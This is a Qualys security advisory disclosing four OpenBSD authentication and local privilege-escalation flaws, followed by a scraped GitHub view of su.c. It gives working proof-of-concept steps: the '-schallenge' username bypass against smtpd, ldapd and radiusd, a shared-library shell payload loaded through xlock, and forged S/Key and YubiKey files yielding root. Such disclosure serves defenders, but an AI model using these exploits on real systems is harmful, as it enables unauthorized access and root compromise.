   1.3. Case study: ldapd
   1.4. Case study: radiusd
   1.5. Case study: sshd
   1.6. Case study: su
2. CVE-2019-19520: Local privilege escalation via xlock
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
4. CVE-2019-19519: Local privilege escalation via su
5. Acknowledgments

==============================================================================
1. CVE-2019-19521: Authentication bypass
==============================================================================

We discovered an authentication-bypass vulnerability in OpenBSD's
authentication system: this vulnerability is remotely exploitable in
smtpd, ldapd, and radiusd, but its real-world impact should be studied
on a case-by-case basis. For example, sshd is not exploitable thanks to
its defense-in-depth mechanisms.

==============================================================================
1.1. Analysis
==============================================================================

From the manual page of login.conf:

------------------------------------------------------------------------------
     OpenBSD uses BSD Authentication, which is made up of a variety of
     authentication styles.  The authentication styles currently provided are:
     ...
     passwd     Request a password and check it against the password in the
                master.passwd file.  See login_passwd(8).
     ...
     skey       Send a challenge and request a response, checking it with
                S/Key (tm) authentication.  See login_skey(8).
     ...
     yubikey    Authenticate using a Yubico YubiKey token.  See
                login_yubikey(8).
     ...
     For any given style, the program /usr/libexec/auth/login_style is used to
     perform the authentication.  The synopsis of this program is:

     /usr/libexec/auth/login_style [-v name=value] [-s service] username class
------------------------------------------------------------------------------

This is the first piece of the puzzle: if an attacker specifies a
username of the form "-option", they can influence the behavior of the
authentication program in unexpected ways.

From the manual page of login_passwd:

------------------------------------------------------------------------------
     login_passwd [-s service] [-v wheel=yes|no] [-v lastchance=yes|no] user
                  [class]
     ...
     The service argument specifies which protocol to use with the invoking
     program.  The allowed protocols are login, challenge, and response.  (The
     challenge protocol is silently ignored but will report success as passwd-
     style authentication is not challenge-response based).
------------------------------------------------------------------------------

This is the second piece of the puzzle: if an attacker specifies the
username "-schallenge" (or "-schallenge:passwd" to force a passwd-style
authentication), then the authentication is automatically successful and
therefore bypassed.

==============================================================================
1.2. Case study: smtpd
==============================================================================

To demonstrate how smtpd's authentication can be bypassed, we follow the
instructions from the manual page of smtpd.conf:

------------------------------------------------------------------------------
     In this second example, the aim is to permit mail delivery and relaying
     only for users that can authenticate (using their normal login
     credentials).
           ...
           listen on egress tls pki mail.example.com auth
           ...
           match auth from any for any action "outbound"
------------------------------------------------------------------------------

and we restart smtpd. Then, with our remote-attacker hat on:

------------------------------------------------------------------------------
$ printf '\0-schallenge\0whatever' | openssl base64
AC1zY2hhbGxlbmdlAHdoYXRldmVy

$ openssl s_client -connect 192.168.56.121:25 -starttls smtp
...
EHLO client.example.com
...
AUTH PLAIN AC1zY2hhbGxlbmdlAHdoYXRldmVy
235 2.0.0 Authentication succeeded
------------------------------------------------------------------------------

==============================================================================
1.3. Case study: ldapd
==============================================================================

From the manual page of ldapd:

------------------------------------------------------------------------------
     ldapd can authenticate users via simple binds or SASL with the PLAIN
     mechanism.
     ...
     When using SASL binds, the authentication ID should be a valid username
     for BSD Authentication.

     For plain text passwords to be accepted, the connection must be
     considered secure, either by using an encrypted connection, or by using
     the secure keyword in the configuration file.
------------------------------------------------------------------------------

Over such a secure connection, a remote attacker can bypass ldapd's SASL
authentication:

------------------------------------------------------------------------------
$ ldapsearch -H ldap://192.168.56.121 -O none -U invaliduser -w whatever
SASL/PLAIN authentication started
ldap_sasl_interactive_bind_s: Invalid credentials (49)

$ ldapsearch -H ldap://192.168.56.121 -O none -U -schallenge -w whatever
SASL/PLAIN authentication started
SASL username: -schallenge
...
# numResponses: 1
------------------------------------------------------------------------------

==============================================================================
1.4. Case study: radiusd
==============================================================================

To show how radiusd's authentication can be bypassed, we adapt the
configuration example from the manual page of radiusd.conf:

------------------------------------------------------------------------------
           module load "bsdauth" "/usr/libexec/radiusd/radiusd_bsdauth"
           ...
           authenticate * {
                   authenticate-by "bsdauth"
           }
------------------------------------------------------------------------------

and we send the following (successful) authentication request:

------------------------------------------------------------------------------
$ radiusctl test 192.168.56.121 secret -schallenge password whatever
    ...
    Reply-Message             = "Authentication succeeded"
------------------------------------------------------------------------------

If we further modify radiusd's configuration to restrict access to the
members of the group "operator":

------------------------------------------------------------------------------
           module set "bsdauth"  "restrict-group" "operator"
------------------------------------------------------------------------------

and send our authentication request, then radiusd_bsdauth crashes
because of a NULL-pointer dereference (because getpwnam("-schallenge")
returns NULL):

------------------------------------------------------------------------------
 80 int
 81 main(int argc, char *argv[])
 82 {
...
192                                 pw = getpwnam(user);
...
197                                 if (gr->gr_gid == pw->pw_gid) {
------------------------------------------------------------------------------

==============================================================================
1.5. Case study: sshd
==============================================================================

Even if an attacker were able to bypass sshd's authentication with an
invalid user such as "-schallenge", sshd would eventually reject it:

------------------------------------------------------------------------------
 225 void
 226 monitor_child_preauth(struct ssh *ssh, struct monitor *pmonitor)
 227 {
 ...
 229         int authenticated = 0, partial = 0;
 ...
 249         while (!authenticated) {
 ...
 288         }
 289
 290         if (!authctxt->valid)
 291                 fatal("%s: authenticated invalid user", __func__);
------------------------------------------------------------------------------

Nevertheless, we can use sshd to remotely test whether an OpenBSD system
is vulnerable to CVE-2019-19521 or not:

------------------------------------------------------------------------------
$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive \
      -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 192.168.56.121
...
debug1: Next authentication method: keyboard-interactive
------------------------------------------------------------------------------

It is vulnerable if the connection hangs, because sshd waits for
login_passwd to send a challenge, while login_passwd waits for sshd to
send a response (because login_passwd interprets the username
"-sresponse" as an option).

==============================================================================
1.6. Case study: su
==============================================================================

A local attacker can bypass su's authentication for the invalid user
"-schallenge", but su eventually crashes because of a NULL-pointer
dereference (because getpwnam_r("-schallenge", ...) returns NULL):

------------------------------------------------------------------------------
$ su -L -- -schallenge
Segmentation fault
------------------------------------------------------------------------------

==============================================================================
2. CVE-2019-19520: Local privilege escalation via xlock
==============================================================================

On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is
set-group-ID "auth", not set-user-ID; the following check is therefore
incomplete and should use issetugid() instead:

------------------------------------------------------------------------------
101 _X_HIDDEN void *
102 driOpenDriver(const char *driverName)
103 {
...
113    if (geteuid() == getuid()) {
114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
115       libPaths = getenv("LIBGL_DRIVERS_PATH");
------------------------------------------------------------------------------

A local attacker can exploit this vulnerability and dlopen() their own
driver to obtain the privileges of the group "auth":

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[1] 2706

$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66

$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)
------------------------------------------------------------------------------

==============================================================================
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
==============================================================================

If the S/Key or YubiKey authentication type is enabled (they are both
installed by default but disabled), then a local attacker can exploit
the privileges of the group "auth" to obtain the full privileges of the
user "root" (because login_skey and login_yubikey do not verify that the
files in /etc/skey and /var/db/yubikey belong to the correct user, and
these directories are both writable by the group "auth").

(Note: to obtain the privileges of the group "auth", a local attacker
can first exploit CVE-2019-19520 in xlock.)

If S/Key is enabled (via skeyinit -E), a local attacker with "auth"
privileges can add an S/Key entry (a file in /etc/skey) for the user
"root" (if this file already exists, the attacker cannot simply remove
or rename it, because /etc/skey is sticky; a simple workaround exists,
and is left as an exercise for the interested reader):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root

$ chmod 0600 /etc/skey/root

$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password: EGG LARD GROW HOG DRAG LAIN

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

If YubiKey is enabled (via login.conf), a local attacker with "auth"
privileges can add a YubiKey entry (two files in /var/db/yubikey) for
the user "root" (if these files already exist, the attacker can simply
remove or rename them, because /var/db/yubikey is not sticky):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 32d32ddfb7d5 > /var/db/yubikey/root.uid

$ echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key

$ env -i TERM=vt220 su -l -a yubikey
Password: krkhgtuhdnjclrikikklulkldlutreul

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

==============================================================================
4. CVE-2019-19519: Local privilege escalation via su
==============================================================================

A local attacker can exploit su's -L option ("Loop until a correct
username and password combination is entered") to log in as themselves
but with another user's login class (with the exception of root's login
class if the attacker is not in the group "wheel"), because the class
variable is set once and never reset:

------------------------------------------------------------------------------
 60 int
 61 main(int argc, char **argv)
 62 {
...
174         for (;;) {
...
210                 if (!class && pwd && pwd->pw_class && pwd->pw_class[0] != '\0')
211                         class = strdup(pwd->pw_class);
------------------------------------------------------------------------------

In the following example, Jane (who is a member of the group "wheel")
logs in with root's login class ("daemon"), thereby increasing her
resource limits:

------------------------------------------------------------------------------
$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            512

$ su -l -L
login: root
Password:
Login incorrect
login: jane
Password:

$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            1310
------------------------------------------------------------------------------

In the following example, John (who is not a member of the group
"wheel") logs in with _pbuild's login class ("pbuild"), thereby
increasing his resource limits:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         786432
...
processes            256

$ su -l -L
login: _pbuild
Password:
Login incorrect
login: john
Password:

$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         33554432
...
processes            1024
------------------------------------------------------------------------------

==============================================================================
5. Acknowledgments
==============================================================================

We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published patches for these vulnerabilities less
than 40 hours after our initial contact. We also thank MITRE's CVE
Assignment Team.

[<https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png>]<<https://www.qualys.com/email-banner>>

This message may contain confidential and privileged information. If it has been sent to you in error, please reply to
advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read,
copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that
all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service
providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate
unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.

```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **Authentication vulnerabilities in OpenBSD** *Qualys Security Advisory (Dec 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_3c1dd9f7_20250121_002240.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fblob%2F2dfc98f42e117c7605b52b5020b630d98601dc22%2Fusr.bin%2Fsu%2Fsu.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fblob%2F2dfc98f42e117c7605b52b5020b630d98601dc22%2Fusr.bin%2Fsu%2Fsu.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=openbsd%2Fsrc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openbsd](/openbsd)
/
**[src](/openbsd/src)**
Public

* [Notifications](/login?return_to=%2Fopenbsd%2Fsrc) You must be signed in to change notification settings
* [Fork
  876](/login?return_to=%2Fopenbsd%2Fsrc)
* [Star
   3.3k](/login?return_to=%2Fopenbsd%2Fsrc)

* [Code](/openbsd/src)
* [Pull requests
  0](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

Additional navigation options

* [Code](/openbsd/src)
* [Pull requests](/openbsd/src/pulls)
* [Security](/openbsd/src/security)
* [Insights](/openbsd/src/pulse)

## Files

 2dfc98f
## Breadcrumbs

1. [src](/openbsd/src/tree/2dfc98f42e117c7605b52b5020b630d98601dc22)
2. /[usr.bin](/openbsd/src/tree/2dfc98f42e117c7605b52b5020b630d98601dc22/usr.bin)
3. /[su](/openbsd/src/tree/2dfc98f42e117c7605b52b5020b630d98601dc22/usr.bin/su)
/
# su.c

Copy path Blame  Blame
## Latest commit

## History

[History](/openbsd/src/commits/2dfc98f42e117c7605b52b5020b630d98601dc22/usr.bin/su/su.c)506 lines (454 loc) · 12.5 KB 2dfc98f
## Breadcrumbs

1. [src](/openbsd/src/tree/2dfc98f42e117c7605b52b5020b630d98601dc22)
2. /[usr.bin](/openbsd/src/tree/2dfc98f42e117c7605b52b5020b630d98601dc22/usr.bin)
3. /[su](/openbsd/src/tree/2dfc98f42e117c7605b52b5020b630d98601dc22/usr.bin/su)
/
# su.c

Top
## File metadata and controls

* Code
* Blame

506 lines (454 loc) · 12.5 KB[Raw](https://github.com/openbsd/src/raw/2dfc98f42e117c7605b52b5020b630d98601dc22/usr.bin/su/su.c)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506/\* $OpenBSD: su.c,v 1.78 2019/12/04 09:51:09 deraadt Exp $ \*/
/\* \* Copyright (c) 1988 The Regents of the University of California. \* All rights reserved. \* \* Redistribution and use in source and binary forms, with or without \* modification, are permitted provided that the following conditions \* are met: \* 1. Redistributions of source code must retain the above copyright \* notice, this list of conditions and the following disclaimer. \* 2. Redistributions in binary form must reproduce the above copyright \* notice, this list of conditions and the following disclaimer in the \* documentation and/or other materials provided with the distribution. \* 3. Neither the name of the University nor the names of its contributors \* may be used to endorse or promote products derived from this software \* without specific prior written permission. \* \* THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND \* ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE \* ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE \* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL \* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS \* OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) \* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT \* LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY \* OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF \* SUCH DAMAGE. \*/
#include <sys/time.h>#include <sys/resource.h>
#include <err.h>#include <errno.h>#include <grp.h>#include <login\_cap.h>#include <paths.h>#include <pwd.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <syslog.h>#include <unistd.h>#include <limits.h>#include <utmp.h>#include <stdarg.h>#include <bsd\_auth.h>
char \*getloginname(void);char \*ontty(void);int chshell(const char \*);int verify\_user(char \*, struct passwd \*, char \*, login\_cap\_t \*, auth\_session\_t \*);void usage(void);void auth\_err(auth\_session\_t \*, int, const char \*, ...);void auth\_errx(auth\_session\_t \*, int, const char \*, ...);
intmain(int argc, char \*\*argv){ int asme = 0, asthem = 0, ch, fastlogin = 0, emlogin = 0, prio; int altshell = 0, homeless = 0; char \*user, \*shell = NULL, \*avshell, \*username, \*\*np; char \*class = NULL, \*style = NULL, \*p; enum { UNSET, YES, NO } iscsh = UNSET; char avshellbuf[PATH\_MAX]; extern char \*\*environ; auth\_session\_t \*as; struct passwd \*pwd; login\_cap\_t \*lc; uid\_t ruid; u\_int flags;
 if (pledge("stdio unveil rpath getpw proc exec id", NULL) == -1) err(1, "pledge");
 while ((ch = getopt(argc, argv, "a:c:fKLlms:-")) != -1) switch (ch) { case 'a': if (style) usage(); style = optarg; break; case 'c': if (class) usage(); class = optarg; break; case 'f': fastlogin = 1; break; case 'K': if (style) usage(); style = "passwd"; break; case 'L': emlogin = 1; break; case 'l': case '-': asme = 0; asthem = 1; break; case 'm': asme = 1; asthem = 0; break; case 's': altshell = 1; shell = optarg; break; default: usage(); } argv += optind;
 errno = 0; prio = getpriority(PRIO\_PROCESS, 0); if (errno) prio = 0; setpriority(PRIO\_PROCESS, 0, -2); openlog("su", LOG\_CONS, 0);
 if ((as = auth\_open()) == NULL) { syslog(LOG\_ERR, "auth\_open: %m"); err(1, "unable to initialize BSD authentication"); } auth\_setoption(as, "login", "yes");
 /\* get current login name and shell \*/ ruid = getuid(); username = getlogin();
 if (ruid && class) auth\_errx(as, 1, "only the superuser may specify a login class");
 if (ruid && altshell) auth\_errx(as, 1, "only the superuser may specify a login shell");
 if (username != NULL) auth\_setoption(as, "invokinguser", username);
 if (username == NULL || (pwd = getpwnam(username)) == NULL || pwd->pw\_uid != ruid) pwd = getpwuid(ruid); if (pwd == NULL) auth\_errx(as, 1, "who are you?"); if ((username = strdup(pwd->pw\_name)) == NULL) auth\_err(as, 1, NULL); if (asme && !altshell) { if (pwd->pw\_shell && \*pwd->pw\_shell) { if ((shell = strdup(pwd->pw\_shell)) == NULL) auth\_err(as, 1, NULL); } else { shell = \_PATH\_BSHELL; iscsh = NO; } }
 if (unveil(\_PATH\_LOGIN\_CONF, "r") == -1) err(1, "unveil"); if (unveil(\_PATH\_LOGIN\_CONF ".db", "r") == -1) err(1, "unveil"); if (unveil(\_PATH\_AUTHPROGDIR, "x") == -1) err(1, "unveil"); if (unveil(\_PATH\_SHELLS, "r") == -1) err(1, "unveil"); if (unveil(\_PATH\_DEVDB, "r") == -1) err(1, "unveil");
 for (;;) { /\* get target user, default to root unless in -L mode \*/ if (\*argv) { user = \*argv; } else if (emlogin) { if ((user = getloginname()) == NULL) { auth\_close(as); exit(1); } } else { user = "root"; } /\* style may be specified as part of the username \*/ if ((p = strchr(user, ':')) != NULL) { \*p++ = '\0'; style = p; /\* XXX overrides -a flag \*/ }
 /\* \* Clean and setup our current authentication session. \* Note that options \*are\* not cleared. \*/ auth\_clean(as); if (auth\_setitem(as, AUTHV\_INTERACTIVE, "True") != 0 || auth\_setitem(as, AUTHV\_NAME, user) != 0) auth\_err(as, 1, NULL); if ((user = auth\_getitem(as, AUTHV\_NAME)) == NULL) auth\_errx(as, 1, "internal error"); if (auth\_setpwd(as, NULL) || (pwd = auth\_getpwd(as)) == NULL) { if (emlogin) pwd = NULL; else auth\_errx(as, 1, "unknown login %s", user); }
 /\* If the user specified a login class, use it \*/ if (!class && pwd && pwd->pw\_class && pwd->pw\_class[0] != '\0') class = strdup(pwd->pw\_class); if ((lc = login\_getclass(class)) == NULL) auth\_errx(as, 1, "no such login class: %s", class ? class : LOGIN\_DEFCLASS);
 if ((ruid == 0 && !emlogin) || verify\_user(username, pwd, style, lc, as) == 0) break; syslog(LOG\_AUTH|LOG\_WARNING, "BAD SU %s to %s%s", username, user, ontty()); if (!emlogin) { fprintf(stderr, "Sorry\n"); auth\_close(as); exit(1); } fprintf(stderr, "Login incorrect\n"); } if (pwd == NULL) auth\_errx(as, 1, "internal error");
 if (pledge("stdio unveil rpath getpw exec id", NULL) == -1) err(1, "pledge");
 if (!altshell) { if (asme) { /\* must be root to override non-std target shell \*/ if (ruid && !chshell(pwd->pw\_shell)) auth\_errx(as, 1, "permission denied (shell)."); } else if (pwd->pw\_shell && \*pwd->pw\_shell) { if ((shell = strdup(pwd->pw\_shell)) == NULL) auth\_err(as, 1, NULL); iscsh = UNSET; } else { shell = \_PATH\_BSHELL; iscsh = NO; } }
 if (unveil(shell, "x") == -1) err(1, "unveil"); if (unveil(pwd->pw\_dir, "r") == -1) err(1, "unveil");
 if ((p = strrchr(shell, '/'))) avshell = p+1; else avshell = shell;
 /\* if we're forking a csh, we want to slightly muck the args \*/ if (iscsh == UNSET) iscsh = strcmp(avshell, "csh") ? NO : YES;
 if (!asme) { if (asthem) { p = getenv("TERM"); if ((environ = calloc(1, sizeof (char \*))) == NULL) auth\_errx(as, 1, "calloc"); if (setusercontext(lc, pwd, pwd->pw\_uid, LOGIN\_SETPATH)) auth\_err(as, 1, "unable to set user context"); if (p && setenv("TERM", p, 1) == -1) auth\_err(as, 1, "unable to set environment");
 setegid(pwd->pw\_gid); seteuid(pwd->pw\_uid);
 homeless = chdir(pwd->pw\_dir); if (homeless == -1) { if (login\_getcapbool(lc, "requirehome", 0)) { auth\_err(as, 1, "%s", pwd->pw\_dir); } else { if (unveil("/", "r") == -1) err(1, "unveil"); printf("No home directory %s!\n", pwd->pw\_dir); printf("Logging in with home = \"/\".\n"); if (chdir("/") == -1) auth\_err(as, 1, "/"); } } setegid(0); /\* XXX use a saved gid instead? \*/ seteuid(0); } else if (pwd->pw\_uid == 0) { if (setusercontext(lc, pwd, pwd->pw\_uid, LOGIN\_SETPATH|LOGIN\_SETUMASK)) auth\_err(as, 1, "unable to set user context"); } if (asthem || pwd->pw\_uid) { if (setenv("LOGNAME", pwd->pw\_name, 1) == -1 || setenv("USER", pwd->pw\_name, 1) == -1) auth\_err(as, 1, "unable to set environment"); } if (setenv("HOME", homeless ? "/" : pwd->pw\_dir, 1) == -1 || setenv("SHELL", shell, 1) == -1) auth\_err(as, 1, "unable to set environment"); } else if (altshell) { if (setenv("SHELL", shell, 1) == -1) auth\_err(as, 1, "unable to set environment"); } if (pledge("stdio rpath getpw exec id", NULL) == -1) err(1, "pledge");
 np = \*argv ? argv : argv - 1; if (iscsh == YES) { if (fastlogin) \*np-- = "-f"; if (asme) \*np-- = "-m"; }
 if (asthem) { avshellbuf[0] = '-'; strlcpy(avshellbuf+1, avshell, sizeof(avshellbuf) - 1); avshell = avshellbuf; } else if (iscsh == YES) { /\* csh strips the first character... \*/ avshellbuf[0] = '\_'; strlcpy(avshellbuf+1, avshell, sizeof(avshellbuf) - 1); avshell = avshellbuf; }
 \*np = avshell;
 if (ruid != 0) syslog(LOG\_NOTICE|LOG\_AUTH, "%s to %s%s", username, user, ontty());
 setpriority(PRIO\_PROCESS, 0, prio); if (emlogin) { flags = LOGIN\_SETALL & ~LOGIN\_SETPATH; /\* \* Only call setlogin() if this process is a session leader. \* In practice, this means the login name will be set only if \* we are exec'd by a shell. This is important because \* otherwise the parent shell's login name would change too. \*/ if (getsid(0) != getpid()) flags &= ~LOGIN\_SETLOGIN; } else { flags = LOGIN\_SETRESOURCES|LOGIN\_SETGROUP|LOGIN\_SETUSER; if (asthem) flags |= LOGIN\_SETENV|LOGIN\_SETPRIORITY|LOGIN\_SETUMASK; } if (setusercontext(lc, pwd, pwd->pw\_uid, flags) != 0) auth\_err(as, 1, "unable to set user context");
 if (pledge("stdio rpath exec", NULL) == -1) err(1, "pledge");
 if (pwd->pw\_uid && auth\_approval(as, lc, pwd->pw\_name, "su") == 0) auth\_err(as, 1, "approval failure"); auth\_close(as);
 execv(shell, np); err(1, "%s", shell);}
intverify\_user(char \*from, struct passwd \*pwd, char \*style, login\_cap\_t \*lc, auth\_session\_t \*as){ struct group \*gr; char \*\*g, \*cp; int authok;
 /\* \* If we are trying to become root and the default style \* is being used, don't bother to look it up (we might be \* be su'ing up to fix /etc/login.conf) \*/ if ((pwd == NULL || pwd->pw\_uid != 0 || style == NULL || strcmp(style, LOGIN\_DEFSTYLE) != 0) && (style = login\_getstyle(lc, style, "auth-su")) == NULL) auth\_errx(as, 1, "invalid authentication type");
